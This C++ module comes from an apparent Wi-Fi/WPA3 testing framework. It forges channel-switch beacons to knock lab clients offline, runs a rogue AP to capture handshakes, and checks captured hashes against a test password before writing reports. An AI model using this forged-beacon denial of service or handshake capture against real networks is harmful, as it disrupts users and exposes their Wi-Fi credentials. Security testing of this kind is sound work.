#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include <cassert>
#include <chrono>
#include <filesystem>
#include <optional>
#include <thread>
#include <nlohmann/json.hpp>

#include "inteprrupt.h"
#include "attacks/components/setup_connections.h"
#include "ex_program/hostapd/hostapd.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "logger/error_log.h"
#include "logger/log_util.h"
#include "logger/report.h"
#include "observer/observers.h"
#include "observer/tshark_wrapper.h"
#include "scan/active/scan_AP.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::CSA_attack{
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

using namespace observer::tshark;

static Dot11Beacon with_sorted_ies(const Dot11Beacon &src) {
	auto opts = src.options();
	vector sorted_opts(opts.begin(), opts.end());
	// ID 61 (HT Operation) excluded — contains primary channel, conflicts with CSA IE
	//TODO reuse in mitm

	erase_if(sorted_opts, [](const auto &o) {
		const auto id = static_cast<uint8_t>(o.option());
		return id != 0 && id != 1 && id != 3 && id != 5
			&& id != 37 && id != 42 && id != 45 //&& id != 48 //FIXME to bez tagu 48/61 ho aspoň odpojilo.
			&& id != 50 && id != 59
			&& id != 127 && id != 221;
	});
	ranges::sort(sorted_opts, [](const auto &a, const auto &b) {
		return static_cast<uint8_t>(a.option()) < static_cast<uint8_t>(b.option());
	});

	Dot11Beacon result;
	result.addr1(src.addr1());
	result.addr2(src.addr2());
	result.addr3(src.addr3());
	result.capabilities() = src.capabilities();
	result.interval(src.interval());
	result.timestamp(src.timestamp());

	for (const auto &opt : sorted_opts)
		result.add_option(opt);
	return result;
}

RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const string &ssid, const Channel &ap_channel,
						const Channel &new_channel, const int switch_count,
						const Dot11Beacon *src_beacon
){
	Dot11Beacon b = src_beacon ? *src_beacon : Dot11Beacon{};

	Dot11ManagementFrame::channel_switch_type cs;
	cs.switch_mode = 1;
	cs.new_channel = new_channel.ch_num;
	cs.switch_count = switch_count;
	b.channel_switch(cs);

	b = with_sorted_ies(b);
	b.addr1(Dot11::BROADCAST);
	b.addr2(ap_mac);
	b.addr3(ap_mac);

	RadioTap radiotap{};
	radiotap.inner_pdu(b);
	return radiotap;
}

void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
					const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
					const int attack_time
){
	//TODO change to  helper for Bl0ck/malformed eapol/CSA, Dos_HARd?
	PacketSender sender{iface_name};
	const auto end_time = steady_clock::now() + seconds(attack_time);

	scan::ScanAP scan_ap{};
	scan_ap.bssid = ap_mac;
	const unique_ptr<Dot11Beacon> beacon = scan::RSN_scan(iface_name, 20, scan_ap); //TODO hardcoded tscan_timeout
	if(beacon){ log(LogLevel::ERROR, "not found beacon for reproduce");}
	cout << "check_vulnerable called with:\n" << "AP MAC: " << ap_mac << "\n" << "STA MAC: " << sta_mac << "\n" <<
		"Interface: " << iface_name << "\n" << "Channel: " << ap_channel.ch_num << "\n" << "SSID: " << ssid << '\n';
	RadioTap csa_rt = get_CSA_beacon(ap_mac, ssid, ap_channel, new_channel, 3, beacon.get());
	while(steady_clock::now() < end_time && !g_interrupted.load()){
		sender.send(csa_rt);
		this_thread::sleep_for(milliseconds(ms_interval));
	}

}

// ----------------- MODULE functions ------------------
void setup_chs_attack(RunStatus &rs){
	// only setup if can
	components::client_ap_setup(rs, false);
	components::setup_rogue_ap(rs);
}

void run_chs_attack(RunStatus &rs){
	const auto &att_cfg = rs.config().at("attack_config");
	const auto &ap_actor = rs.get_actor("ap");

	const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::mac));
	const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
	const string iface_name = rs.get_actor("attacker").get(SK::iface);
	const string essid = ap_actor.get(SK::ssid);
	const Channel old_channel = ap_actor->get_channel();
	const Channel new_channel{
		att_cfg.at("new_channel").get<uint8_t>(), ap_actor->get_channel().band, ap_actor[SK::ht_mode]
	};
	const int ms_interval = att_cfg.at("ms_interval");
	const int attack_time = att_cfg.at("attack_time");

	rs.start_observers();

	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
	if(g_interrupted.load()) return;
	log(LogLevel::INFO, "Attack START");
	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
	log(LogLevel::INFO, "Attack END");
	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));

	rs.process_manager.stop_all();
}

void generate_report(const RunStatus &rs, const path &STA_graph_path, const path &AP_graph_path,
					const path &ATT_graph_path, const path &rogue_graph_path,
					const optional<hostapd::CrackResult> &crack_result
){
	report::ReportGuard report(rs.run_folder());
	if(!report) return;

	report << "# CSA DoS Attack\n\n";
	//FIXME link to CSA attack
	//report << "Channel switch announcement will change channel of station, station will disconnect\n\n";
	report::attack_config_table(report, rs);
	report::attack_mapping_table(report, rs);
	//report << "### Traffic Analysis\n";
	//report << "Charts represent the network speed captured during the test. (STA->AP)\n";
	//TODO add hostapd helper ?
	if(!STA_graph_path.empty()){
		report << "### STA (client, wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
		report << "![STA Throughput Graph](" << STA_graph_path << ")\n\n";
	}
	if(!AP_graph_path.empty()){
		report << "### AP (ap, hostapd " << hostapd::get_version(rs, "ap") << ")\n";
		report << "![AP Throughput Graph](" << AP_graph_path << ")\n\n";
	}
	if(!ATT_graph_path.empty()){
		report << "### ATT (ap, hostapd-mana " << hostapd::get_version(rs, "ap") << ")\n";
		report << "![ATT Throughput Graph](" << ATT_graph_path << ")\n\n";
	}
	if(!rogue_graph_path.empty()){
		report << "###  Rogue AP (rogue_ap)\n";
		report << "![Rogue AP Throughput Graph](" << rogue_graph_path << ")\n\n";
	}
	if(crack_result.has_value()){
		report << "## Credential Cracking (hcxpmktool)\n";
		report << "Each captured handshake was verified against the known PSK using hcxpmktool.\n\n";
		report << "| Metric | Value |\n|--------|-------|\n";
		report << "| Captured handshakes | " << crack_result->total << " |\n";
		report << "| Successfully cracked | " << crack_result->cracked << " |\n\n";
	}

	report << "---\n";
}

void stats_chs_attack(const RunStatus &rs){
	log(LogLevel::INFO, "CSA attack stats");

	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, {DISCONNECT, CONNECT, TESTER_TAGS});
	rs.log_events(elements, {{"client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH", "SWITCH", "blue"}});

	optional<bool> disconnected;
	string disconnected_source;
	const string client_mac = rs.get_actor("client").get(SK::mac);
	if(rs.get_actor("client")->is_WB()){
		const path client_log = rs.run_folder() / "logger" / "client.log";
		if(exists(client_log)){
			disconnected = !get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED", true).empty();
			disconnected_source = "log";
		}
	} else {
		const path pcap_path = observer::get_observer_folder(rs, "tshark") / "attacker_capture.pcap";
		if(exists(pcap_path)){
			const string filter = "wlan.fc.type_subtype == 0x000c && wlan.sa == " + client_mac;
			disconnected = !get_tshark_events(rs, "attacker", filter, "DISCONNECTED").empty();
			disconnected_source = "pcap";
		}
	}

	const bool ap_disconnected = !get_time_logs(rs, "ap", "AP-STA-DISCONNECTED", true).empty();

	optional<hostapd::CrackResult> crack_result;
	optional<bool> rogue_ap_connected;
	if(rs.config().at("actors").contains("rogue_ap")){
		const auto mana_events = get_time_logs(rs, "rogue_ap", "Captured a WPA", true);
		elements.push_back(make_unique<EventLines>(mana_events, "MANA", "black"));
		rogue_ap_connected = !mana_events.empty();

		string psk = hostapd::get_password(rs, "client");
		if(psk.empty()) psk = "password123"; //TODO hardcoded
		crack_result = hostapd::crack_pmk_hashes(rs.run_folder()/"captured_hashes.txt", psk);
	}

	nlohmann::json result = {{"ap_disconnected", ap_disconnected}};
	if(disconnected.has_value()){
		result["disconnected"] = *disconnected;
		result["disconnected_source"] = disconnected_source;
	}

	if(rogue_ap_connected.has_value()) result["rogue_ap_connected"] = rogue_ap_connected.value();
	rs.save_result(result);

	pcap_events(rs, elements, {
									{
										"attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac,
										"client PROBE", "black"
									},
									{
										"rogue_ap", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac,
										"client PROBE", "red"
									}
								});

	//TODO change to tshark grpas vector -> change
	const path STA_graph_path = tshark_graph(rs, "client", elements);
	const path AP_graph_path = tshark_graph(rs, "ap", elements,
															observer::get_observer_folder(rs, "tcpdump"));

	const path ATT_graph_path = tshark_graph(rs, "attacker", elements);
	const path rogue_graph_path = tshark_graph(rs, "rogue_ap", elements);

	generate_report(rs, STA_graph_path, AP_graph_path, ATT_graph_path, rogue_graph_path, crack_result);
}
}
